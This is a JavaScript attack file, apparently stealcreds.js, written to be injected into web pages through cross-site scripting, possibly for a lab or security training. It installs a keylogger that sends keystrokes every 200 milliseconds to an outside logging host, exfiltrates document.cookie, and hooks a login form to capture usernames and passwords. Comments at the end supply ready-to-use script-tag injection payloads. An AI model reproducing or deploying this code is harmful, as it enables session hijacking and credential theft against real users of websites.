var buffer = [];
var category='default';
var urlroot = 'http://sprg-tools.el.eee.intern/';
//var urlroot = 'http://localhost:9090/';

window.console.info('document.cookie : ' + document.cookie);

function installKeylogger(cat) {
    category = cat ? cat : 'me';
    document.onkeypress = function (e) {
        var timestamp = Date.now() | 0;
        var stroke = {
            k: e.key,
            t: timestamp
        };
        buffer.push(stroke);
    }
    window.console.log('keylogger installed.');
    window.setInterval(function () {
        if (buffer.length > 0) {
            sendToLogService(buffer);
            buffer = [];
        }
    }, 200);
}

function sendToLogService(jsondata) {
    var data = encodeURIComponent(JSON.stringify(jsondata));
    var url = urlroot + '/log/' + category + '/' + data;
    new Image().src = url;
    window.console.log('data sent, url : ' + url);
}

function stealCookie(cat) {
    category = cat ? cat : 'me';
    var text = document.cookie;
    var data = [{k:text,t:Date.now() | 0}];
    sendToLogService(data);
    window.console.log('document.cookie sent.');
}

//unfortunately does not with chrome browser :(
//because the script cannot access the dom
function installSubmitListener(cat) {
    category = cat ? cat : 'me';
    var loginform = document.forms[0];
    window.console.log('loginform : ' + loginform);
    loginform.onsubmit = function() {
        var username = document.getElementById('username');
        var password = document.getElementById('password');
        var text = username + ':' + password;
        var data = [{k:text,t:Date.now() | 0}];
        sendToLogService(data);
        window.console.log('loginform.onsubmit sent.');
        return false;
    }
    window.console.log('loginform.onsubmit installed.');
}

//!! it has to be in this
//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installKeylogger()</script>
//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>stealCookie()</script>
//<script src='http://localhost:9090/js/stealcreds.js'></script><script>installKeylogger()</script>
//<script src='http://localhost:9090/js/stealcreds.js'></script><script>stealCookie()</script>